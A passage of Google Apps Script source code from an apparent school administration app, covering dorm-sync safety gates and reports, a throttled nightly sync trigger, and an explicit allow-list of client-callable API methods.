        let stem = key.replace(/(iii|ii|i|3|2|1|ⅲ|ⅱ|ⅰ)$/i, '');
        let hits = studentsInDorms.filter(s => {
          let sn = s.dormNorm;
          // containment-based presence (same rule the matcher uses), ignoring room digits
          let snNoRoom = sn.replace(/[0-9]+(-[0-9]+)?$/, '');
          return sn.includes(key) || key.includes(snNoRoom) || (stem.length >= 2 && snNoRoom.includes(stem));
        });
        if (hits.length > 0) {
          presenceLines.push(`[${bInfo.rawJp}] 類似する寮名の学生: ` + hits.slice(0, 5).map(h => `'${h.rawDorm}'`).join(", "));
        }
      });
      if (presenceLines.length > 0) {
        errorMsg += "■ 建物名に類似する学生の寮データ（部屋番号や綴りを確認してください）:\n" + presenceLines.slice(0, 15).join("\n") + "\n\n";
      } else {
        errorMsg += "■ どの建物名も学生の寮データに見つかりませんでした。\n建物マスターの名前と、学生データの「寮」列の表記が一致しているか確認してください。\n\n";
      }
    }
    if (debugLog.length > 0) errorMsg += "詳細ログ (一部):\n" + debugLog.slice(0, 10).join("\n");
    errorMsg += `\n\n※ 自動割り当ては「空室」の部屋のみが対象です。対象の部屋が「空室」になっているか、また部屋番号・建物名の表記が学生データと一致しているかをご確認ください。`;
    return errorMsg;
  }
}

const AUTO_SYNC_MIN_GAP_SEC = 600;   // 10 min — far below any trigger interval

// The dorm sync's blast-radius cap. See the sanity gate in syncDormsFromCentralDB:
// beyond this share of the occupied rooms, "everyone moved out" is a broken input,
// not a month of move-outs, so the vacates are dropped and the assignments kept.
// ⚠️ The floor exists so a small building can still register genuine move-outs —
// without it, 4 occupied rooms could never lose 2.
const DORM_VACATE_MAX_RATIO = 0.3;
const DORM_VACATE_MIN = 5;
const DORM_SYNC_REPORT_PROP = "DORM_SYNC_REPORT";
// ⚠️ Only the last 40 room labels are kept. The property has a hard size limit and
// a broken run can name every room in the dorms; a report that fails to save is a
// report nobody sees.
const DORM_SYNC_REPORT_MAX_ROOMS = 40;

function _saveDormSyncReport_(rep) {
  try {
    rep.rooms = (rep.rooms || []).slice(0, DORM_SYNC_REPORT_MAX_ROOMS);
    rep.at = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm");
    // ⚠️ ONE status, derived here rather than re-inferred by each reader from the
    // shape of the object. The report used to record only exceptional outcomes, so
    // "ran cleanly" and "died on line one" were the same empty screen; the client
    // now branches on this and can say which happened.
    rep.status = rep.error ? "failed"
               : rep.gate ? "held"
               : (rep.rooms && rep.rooms.length) ? "vacated"
               : "clean";
    PropertiesService.getScriptProperties()
      .setProperty(DORM_SYNC_REPORT_PROP, JSON.stringify(rep));
  } catch (e) {
    // Never let the bookkeeping fail the sync that already wrote the sheet.
    try { console.warn("dorm sync report not saved: " + e); } catch (e2) {}
  }
}

// What the gate says when it holds the vacates back. One place: the two return
// paths of syncDormsFromCentralDB both reach it, and they used to be the kind of
// pair that drifts.
function _dormGateMessage_(reason, held) {
  return "\n\n⚠️ 空室にする処理を保留しました（" + reason + "）。\n" +
         "対象だった " + held + " 室はそのままです。\n" +
         "学生データを確認のうえ、もう一度「自動割当」を実行してください。";
}

// 要確認 panel ✕: one person clears it for everyone, and it is recorded.
//
// ⚠️ Shared on purpose. "Someone has dealt with this" is a fact about the school,
// not about a browser, so it is not a localStorage flag — and the activity log is
// where every other dorm action already lands.
//
// ⚠️ It takes the report's `at` and refuses a mismatch. The nightly run can produce
// a DIFFERENT report between the page load and the click; without this, clearing
// the panel would silently acknowledge a warning the clicker never read.
//
// ⚠️ Marks rather than deletes. The record of what the sync did should survive
// being dismissed — the next run overwrites it wholesale anyway.
function acknowledgeDormSyncReport(userRole, userPerms, actorName, actorId, at) {
  if (!_hasPerm_(userRole, userPerms, "edit_dorms")) throw new Error("権限がありません");
  const rep = _readDormSyncReport_();
  if (!rep) return "確認するレポートがありません。";
  if (String(rep.at || "") !== String(at || "")) {
    throw new Error("新しい同期レポートが届いています。画面を再読み込みしてから確認してください。");
  }
  rep.acked = true;
  rep.ackedBy = actorName || "";
  try {
    PropertiesService.getScriptProperties()
      .setProperty(DORM_SYNC_REPORT_PROP, JSON.stringify(rep));
  } catch (e) {
    throw new Error("確認状態を保存できませんでした: " + e);
  }
  _logActivity_({ role: userRole, name: actorName || "", id: actorId || "" },
               "寮同期レポートを確認済みに", SHEET_ROOM,
               (rep.gate ? "保留: " + rep.gate : "空室化 " + (rep.vacated || 0) + "室") +
               " / " + String(rep.at || ""));
  return "Success";
}

function _readDormSyncReport_() {
  try {
    const raw = PropertiesService.getScriptProperties().getProperty(DORM_SYNC_REPORT_PROP);
    return raw ? JSON.parse(raw) : null;
  } catch (e) { return null; }
}

// Runs unattended from a time trigger, so it CANNOT use the maintenance unlock:
// a locked-out trigger fails daily and the sync silently stops. It is also
// web-callable like everything else, and it hands itself the "admin" role, so
// anyone could hammer it.
//
// A throttle is the right shape here rather than a gate. It bounds the abuse to
// what the trigger legitimately does anyway — at worst one sync per 10 minutes,
// against a trigger that runs far less often than that — while never refusing
// the trigger itself.
function triggerAutoSyncStudents() {
  try {
    const cache = CacheService.getScriptCache();
    if (cache.get('autoSyncRan')) {
      try { console.warn("triggerAutoSyncStudents throttled — ran less than " + AUTO_SYNC_MIN_GAP_SEC + "s ago"); } catch (e) {}
      return "throttled";
    }
    cache.put('autoSyncRan', '1', AUTO_SYNC_MIN_GAP_SEC);
  } catch (e) { /* no cache — the trigger must still work, so fall through */ }
  // ⚠️ The trigger runs unattended, so there is no session — and once
  // AUTH_ENFORCE=1 the guards read the session, not the argument. Passing "admin"
  // works today only because observe mode still trusts the argument; at the flip
  // this would start throwing 権限がありません every night and the sync would stop
  // with nothing on screen to show for it.
  //
  // A time trigger IS the authorisation: it exists because the owner created it.
  // So state that explicitly rather than leaving the call to be silently denied.
  const was = _authUser;
  _authUser = { role: "master", id: "SYSTEM", name: "システム", permissions: "ALL" };
  try {
    fetchAndMergeStudentData("admin");
    // ⚠️ AFTER the student sync, for the same reason as the snapshot below: it reads
    // Central_DB, so it has to see today's data, not yesterday's. In its own
    // try/catch because the student sync is the important half and must not fail
    // because dorm housekeeping did.
    //
    // This is what makes the room vacancy handling automatic — there is no scope to
    // choose and no dry run to press, and syncDormsFromCentralDB's sanity gate is
    // what makes it safe to run with nobody watching.
    try {
      syncDormsFromCentralDB("master", "ALL", "システム", "SYSTEM");
    } catch (e) {
      // ⚠️ RECORD it, do not only warn. Nobody reads the execution log of a job that
      // runs at 3am; a console.warn here is the same blank screen as a clean run.
      // It overwrites any earlier warning on purpose — the newest run's outcome is
      // what the panel must show, and a failure outranks a stale advisory.
      try { console.warn("dorm sync failed in trigger: " + e); } catch (e2) {}
      // ⚠️ DORM-05 is the catch-all: whatever went wrong, it reached the panel with
      // a code you can look up rather than a raw Apps Script message on screen.
      _saveDormSyncReport_({
        updated: 0, occupiedUpdated: 0, vacated: 0, gate: "", held: 0, rooms: [],
        error: "寮の自動割当が最後まで実行できませんでした。（DORM-05）",
        detail: String((e && e.message) || e)
      });
    }
    // ⚠️ AFTER the sync, so the month is recorded against fresh data rather than
    // yesterday's. It REPLACES the current month on every run — it used to write
    // once, on the first run of a new month, which gave a start-of-month figure
    // while the report is 月末締. It swallows its own errors: the sync is the
    // important half and must not fail because housekeeping did.
    _recordEnrollmentSnapshot_();
    // ⚠️ AFTER the snapshot, which is what writes today's roster — the check needs
    // this month in place to compare the two before it against. Separate from the
    // snapshot because that one stands down on a 手動 month and this one should
    // not: a typed 合計 does not make its predecessor above suspicion.
    _recordEnrollmentReturns_();
  } finally {
    _authUser = was;
  }
}

// ============================================================================
// API REGISTRY — the explicit allow-list apiCall dispatches through.
//
// ⚠️ EXPLICIT ON PURPOSE. Dispatching via a dynamic lookup would expose every
// internal — _writeAccountPassword_, _hashPassword_, _snapshotSheet_ — to the same
// call. Only names listed here are reachable through apiCall.
//
// Built lazily rather than as a top-level const: Apps Script evaluates the .js
// files in order, and Shinsei_Code.js loads after this one, so its functions are
// not yet bound while Code.js is being evaluated.
//
// NOT here, deliberately:
//   - the maintenance set — locked behind MAINTENANCE_UNLOCK instead;
//   - doGet / loginUser / getBootBundle / resumeSession / changeOwnPassword /
//     adminResetPassword / completePasswordSetup / logoutSession — these run
//     before a session exists or manage the session itself, and resolve their
//     own token. Routing them through apiCall would be circular.
//
// Adding an endpoint means adding it here. tests/endpoints.test.js fails if an
// exposed function is neither registered nor accounted for.
// ============================================================================
let _apiRegistry = null;

// ⚠️ Registration is for methods the CLIENT calls. checkInterviewResultDuplicate,
// fetchAndMergeStudentData, getLastYearCourseCounts and getRecruitmentContext were
// listed here but are only ever called server-side (from saveInterviewResult, the
// sync trigger, and getRecruitmentBundle). They keep their own guards; they just do
// not need to be reachable through apiCall. Do not re-add without a client caller.
//
// This shrinks the app's intended API. It does NOT make them un-callable over the
// web — every top-level name is still on google.script.run, which is exactly why
// each one keeps its own guard rather than relying on this list.
function _apiMethods_() {
  if (_apiRegistry) return _apiRegistry;
  _apiRegistry = {
    acceptReassignment: acceptReassignment,
    addCancelRow: addCancelRow,
    addNotIssuedRow: addNotIssuedRow,
    addOtherVisaRow: addOtherVisaRow,
    addRecruitmentMeta: addRecruitmentMeta,
    approveBookerDateChange: approveBookerDateChange,
    buildRoomHtmlBatch: buildRoomHtmlBatch,
    cancelBookingFromDateChange: cancelBookingFromDateChange,
    combineRoomHtmlToPdf: combineRoomHtmlToPdf,
    declineReassignment: declineReassignment,
    deleteAnnouncement: deleteAnnouncement,
    deleteBuilding: deleteBuilding,
    deleteCancelRow: deleteCancelRow,
    deleteNotIssuedRow: deleteNotIssuedRow,
    deleteInterviewResult: deleteInterviewResult,
    deleteOtherVisaRow: deleteOtherVisaRow,
    deletePlacementConfig: deletePlacementConfig,
    deleteRoom: deleteRoom,
    deleteSystemUser: deleteSystemUser,
    diagnoseInChargeMatching: diagnoseInChargeMatching,
    exportSpecificPDF: exportSpecificPDF,
    getScheduleBundle: getScheduleBundle,
    saveScheduleTemplate: saveScheduleTemplate,
    deleteScheduleTemplate: deleteScheduleTemplate,
    saveSchedulePhrase: saveSchedulePhrase,
    deleteSchedulePhrase: deleteSchedulePhrase,
    addScheduleLanguage: addScheduleLanguage,
    saveScheduleDayType: saveScheduleDayType,
    deleteScheduleDayType: deleteScheduleDayType,
    getScheduleApplicants: getScheduleApplicants,
    downloadSchedulePdf: downloadSchedulePdf,
    getActivityLog: getActivityLog,
    getAllBuildingDocs: getAllBuildingDocs,
    getAllTeachersSchedule: getAllTeachersSchedule,
    getAnnouncements: getAnnouncements,
    getBookingIntakeOptions: getBookingIntakeOptions,
    getBuildingList: getBuildingList,
    getBuildingRoomsForExport: getBuildingRoomsForExport,
    getDashboardData: getDashboardData,
    getActiveSessions: getActiveSessions,
    revokeUserSessions: revokeUserSessions,
    getRoles: getRoles,
    resetRoleDefaults: resetRoleDefaults,
    saveRole: saveRole,
    deleteRole: deleteRole,
    getDestinationReport: getDestinationReport,
    getDestinationDetail: getDestinationDetail,
    getEnrollmentHistory: getEnrollmentHistory,
    saveEnrollmentMonths: saveEnrollmentMonths,
    getPastStudentDetail: getPastStudentDetail,
    getGraduateExport: getGraduateExport,
    saveDestinationAlias: saveDestinationAlias,
    saveDestinationOverride: saveDestinationOverride,
    getDormData: getDormData,
    getInterviewResultOptions: getInterviewResultOptions,
    getInterviewResults: getInterviewResults,
    getLiveReportData: getLiveReportData,
    getPendingNotifications: getPendingNotifications,
    getUpcomingForUser: getUpcomingForUser,
    getPlacementColumns: getPlacementColumns,
    getPlacementConfig: getPlacementConfig,
    getPlacementHeadersForUrl: getPlacementHeadersForUrl,
    getPlacementReferenceHeaders: getPlacementReferenceHeaders,
    getPlacementResults: getPlacementResults,
    getRecruitmentBundle: getRecruitmentBundle,
    getRecruitmentData: getRecruitmentData,
    getRecruitmentNote: getRecruitmentNote,
    getSimulationData: getSimulationData,
    getSnapshotList: getSnapshotList,
    getSpecificBuilding: getSpecificBuilding,
    getSystemUsers: getSystemUsers,
    getTeacherNotifications: getTeacherNotifications,
    getUploadedFile: getUploadedFile,
    importResultsFromBookings: importResultsFromBookings,
    listAnnouncements: listAnnouncements,
    lookupPriorInterviewResult: lookupPriorInterviewResult,
    markAnnouncementRead: markAnnouncementRead,
    postAnnouncement: postAnnouncement,
    rejectBookerDateChange: rejectBookerDateChange,
    removeBuildingDoc: removeBuildingDoc,
    renameBuildingDoc: renameBuildingDoc,
    removeRecruitmentMeta: removeRecruitmentMeta,
    renameRecruitmentRegion: renameRecruitmentRegion,
    reorderPlacementConfig: reorderPlacementConfig,
    requestBookerDateChange: requestBookerDateChange,
    withdrawActiveRequest: withdrawActiveRequest,
    requestReassignment: requestReassignment,
    restoreSnapshot: restoreSnapshot,
    saveBuilding: saveBuilding,
    saveCancelCell: saveCancelCell,
    saveNotIssuedCell: saveNotIssuedCell,
    saveInterviewResult: saveInterviewResult,
    saveNewRoom: saveNewRoom,
    saveOtherVisaCell: saveOtherVisaCell,
    savePlacementColumns: savePlacementColumns,
    savePlacementConfig: savePlacementConfig,
    savePlacementRowColumns: savePlacementRowColumns,
    saveRecruitmentBatch: saveRecruitmentBatch,
    saveRecruitmentCapacity: saveRecruitmentCapacity,
    saveRecruitmentCount: saveRecruitmentCount,
    saveRecruitmentDates: saveRecruitmentDates,
    saveRecruitmentMetaOrder: saveRecruitmentMetaOrder,
    saveRecruitmentNote: saveRecruitmentNote,
    saveScheduleBatch: saveScheduleBatch,
    saveSchedulePhrasesBatch: saveSchedulePhrasesBatch,
    saveSimulationData: saveSimulationData,
    saveSystemUser: saveSystemUser,
    shinsei_deleteStudent: shinsei_deleteStudent,
    shinsei_exportBatchMergedFromWebApp: shinsei_exportBatchMergedFromWebApp,
    shinsei_exportSingleFromWebApp: shinsei_exportSingleFromWebApp,
    shinsei_getStudentDataForEdit: shinsei_getStudentDataForEdit,
    shinsei_getStudentNames: shinsei_getStudentNames,
    shinsei_lookupInterviewResult: shinsei_lookupInterviewResult,
    shinsei_previewSingleFromWebApp: shinsei_previewSingleFromWebApp,
    shinsei_saveNewStudent: shinsei_saveNewStudent,
    shinsei_updateExistingStudent: shinsei_updateExistingStudent,
    syncDormsFromCentralDB: syncDormsFromCentralDB,
    acknowledgeDormSyncReport: acknowledgeDormSyncReport,
    toggleNotification: toggleNotification,
    // アカウント設定. Scoped to the caller's own account from the session, never an argument.
    getMyAccount: getMyAccount,
    signOutMySession: signOutMySession,
    signOutMyOtherSessions: signOutMyOtherSessions,
    updateBuilding: updateBuilding,
    updateInterviewResult: updateInterviewResult,
    updateRoom: updateRoom,
    uploadBuildingDoc: uploadBuildingDoc,
  };
  return _apiRegistry;
}
